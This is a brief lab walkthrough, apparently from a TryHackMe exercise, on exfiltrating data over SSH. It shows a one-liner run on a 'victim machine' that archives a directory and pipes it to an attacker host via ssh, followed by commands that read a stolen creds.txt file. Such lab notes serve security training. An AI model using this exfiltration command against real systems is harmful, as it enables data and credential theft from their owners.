# How tom exfiltrate data using SSH protocol
### On the victim machine:
`tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"`
We used the tar command the same as the previous task to create an archive file of the task5 directory.
Then we passed the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
We passed the command that must be executed in double quotations, "cd /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.

*On the attackers machine:
```
cd /tmp/task5/
cat creds.txt
```
